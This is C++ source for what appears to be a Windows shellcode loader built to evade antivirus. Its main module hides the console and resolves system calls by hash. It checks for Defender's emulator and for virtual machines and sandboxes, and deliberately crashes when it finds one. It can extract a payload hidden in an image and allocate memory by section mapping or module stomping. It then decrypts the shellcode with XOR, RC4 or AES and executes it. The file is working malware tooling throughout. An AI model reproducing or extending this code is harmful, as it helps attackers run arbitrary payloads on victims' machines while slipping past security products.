#include <iostream>
#include <Windows.h>
#include "Tools.h"
#include "Struct.h"
#include "ShellcodeExec.h"
#include "shellcode.h"
#include "PIGSyscall.hpp"
#include "definition.h"
#include "AntiVm.h"
#include "Function.hpp"

#include <bcrypt.h>
#pragma comment(lib, "bcrypt.lib")

static auto& dynamicInvoker = DynamicInvoker::get_instance();




void test() {
	custom_sleep(500); // sleep 0.5s
}
NTSTATUS AllocateMem(LPVOID* lpMem,PSIZE_T size) {
	NTSTATUS status = 0xC0000001; 

	switch (allocateMethod) {
	case CASE_NtAllocateVirtualMemory: {

		status = dynamicInvoker.Invoke<NTSTATUS>(NtAllocateVirtualMemoryStruct.funcAddr, NtAllocateVirtualMemoryStruct.funcHash,
			(HANDLE)-1, lpMem, 0, size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

		break;
	}case CASE_NtMapOfView: {
		HANDLE hSection = NULL;
		SIZE_T secSize = *size;
		LARGE_INTEGER sectionSize = { secSize };
		pNtCreateSection NtCreateSection = (pNtCreateSection)GetProcAddressbyHASH(GetMoudlebyName(_wcsdup(ENCRYPT_WSTR("ntdll.dll"))), NtCreateSection_Hashed);

		status = NtCreateSection(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

		if (NT_SUCCESS(status)) {
			SIZE_T viewSize = *size;
			LPVOID mem = NULL;

			pNtMapViewOfSection NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddressbyHASH(GetMoudlebyName(_wcsdup(ENCRYPT_WSTR("ntdll.dll"))), NtMapViewOfSection_Hashed);
			status = NtMapViewOfSection(hSection, (HANDLE)-1, lpMem, NULL, NULL, 0, &viewSize, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE);

		}
		break;
	}case CASE_ModuleStomping: {
		HMODULE hModule = myLoadLibrary(ENCRYPT_WSTR("AppVIntegration.dll"));

		if (!hModule) return status;
		PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
		PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
		PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);

		// 查找.data段
		for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
			if (memcmp(section[i].Name, ENCRYPT_STR(".data"), 5) == 0) {
				DWORD oldProtect;
				*lpMem = (LPVOID)((BYTE*)hModule + section[i].VirtualAddress);
				*size = section[i].Misc.VirtualSize;

				status = dynamicInvoker.Invoke<NTSTATUS>(NtProtectVirtualMemoryStruct.funcAddr,
					NtProtectVirtualMemoryStruct.funcHash,
					(HANDLE)-1, lpMem, size, PAGE_READWRITE, &oldProtect);
				break;
			}
		}
		break;
	}
	default:
		break;
	}
	return status;
}
void DecryptShellcode(LPVOID lpMem, SIZE_T size) {
	switch (encryptMethod) {
	case CASE_XOR: {
		DWORD key_int = *(DWORD*)key;
		for (SIZE_T i = 0; i < size; i++) {
			((BYTE*)lpMem)[i] ^= ((key_int >> ((i % 4) * 8)) & 0xFF);
		}
		break;
	}
	case CASE_RC4: {
		// RC4 初始化
		BYTE S[256];
		BYTE temp;
		int i, j = 0;

		// 初始化 S-box
		for (i = 0; i < 256; i++)
			S[i] = i;

		for (i = 0; i < 256; i++) {
			j = (j + S[i] + key[i % key_size]) % 256;
			temp = S[i];
			S[i] = S[j];
			S[j] = temp;
		}

		// RC4 加密/解密
		i = j = 0;
		for (SIZE_T pos = 0; pos < size; pos++) {
			i = (i + 1) % 256;
			j = (j + S[i]) % 256;
			temp = S[i];
			S[i] = S[j];
			S[j] = temp;

			BYTE keystream = S[(S[i] + S[j]) % 256];
			((BYTE*)lpMem)[pos] ^= keystream;
		}
		break;
	}
	case CASE_AES: {
		BCRYPT_ALG_HANDLE hAlg = NULL;
		BCRYPT_KEY_HANDLE hKey = NULL;
		NTSTATUS status;

		// key 的前16字节是 IV，后32字节是实际密钥
		BYTE* iv = key;
		BYTE* aes_key = key + 16;

		// 初始化 AES
		status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
		if (!NT_SUCCESS(status)) return;

		// 创建密钥
		status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, aes_key, 32, 0);
		if (!NT_SUCCESS(status)) {
			BCryptCloseAlgorithmProvider(hAlg, 0);
			return;
		}

		// 解密
		ULONG cbResult;
		status = BCryptDecrypt(
			hKey,
			(PUCHAR)lpMem,
			size,
			NULL,
			iv,        // 使用保存的IV
			16,        // IV size
			(PUCHAR)lpMem,
			size,
			&cbResult,
			BCRYPT_BLOCK_PADDING  // 启用填充
		);

		// 清理
		if (hKey) BCryptDestroyKey(hKey);
		if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
		break;
	}
	default:
		break;
	}
}

// Hide Console
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
// int main() {

	test();
	initAllFunc();


	if (AntiDefenderVM) {
		wdCheckEmulatedVFS();
		if (STATUS_NOT_SUPPORTED != wdIsEmulatorPresent()){ // is emulator
			memcpy(0, 0, 1); // exit
		}
		if (wdIsEmulatorPresent2()) {
			memcpy(0, 0, 1);
		}		
		if (wdIsEmulatorPresent3()) {
			memcpy(0, 0, 1);
		}
	}
	if (checkVXQQ) {
		if (!checkProcessVX_QQ()) memcpy(0, 0, 1);
	}
	if (EnableAntiVM) {
		if (trick_DllGetClassObject) {
			if (checkDllGetClassObject()) {
				memcpy(0, 0, 1);
			}
		}
		if (trick_SxInDll) {
			if (checkSxInDll()) {
				memcpy(0, 0, 1);
			}
		}
		BOOLEAN isVirtualMachine = FALSE;

		isVirtualMachine = checkCPUCoreNum() | checkPhysicalMemory() | checkBootTime() | checkGPUMemory() |
			checkMacAddrPrefix() | accelerated_sleep();
		DebugPrintA(ENCRYPT_STR("isVirtualMachine[+]: %d\n"), isVirtualMachine);
		if (isVirtualMachine) {
			memcpy(0, 0, 1);
		}
		
	}
	
	// ============================= Allocate Memory ===============================
	else { 
		if (EnableSteg) {
			PBYTE stegShellcode = NULL;
			DWORD stegSize = 0;

			// 获取当前目录
			WCHAR currentDir[MAX_PATH];
			GetCurrentDirectoryW(MAX_PATH, currentDir);

			// 构建图片路径
			WCHAR imagePath[MAX_PATH];
			wcscpy_s(imagePath, currentDir);
			wcscat_s(imagePath, stegPath);

			if (!ExtractShellcodeFromImage(imagePath, &stegShellcode, &stegSize)) {
				// DebugPrintA("Failed to extract shellcode from image\n");
				return -1;
			}

			// 使用提取的shellcode替换原始数据
			memcpy(shellcode, stegShellcode, stegSize);
			shellcode_size = stegSize;
			SIZE_T size = 0;
			NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(NtFreeVirtualMemoryStruct.funcAddr, NtFreeVirtualMemoryStruct.funcHash,
				(HANDLE)-1, &stegShellcode,&size,MEM_RELEASE);
			
		}
		LPVOID lpMem = NULL;
		SIZE_T size = shellcode_size;
		NTSTATUS status = AllocateMem(&lpMem, &size);
		// ======================= Processing Payload ==================================
		custom_sleep(500); // sleep 0.5s

		memcpy(lpMem, shellcode, size);
		DecryptShellcode(lpMem, size);
		// ============================  EXECUTE ==================================

		

		ExecuteShellcodeStruct execStruct = { 0 };
		execStruct.lpMem = lpMem;
		execStruct.memSize = size;
		ExecuteShellcode(&execStruct);
		// ============================ EXECUTE END ================================
	}
	

	return 0;
}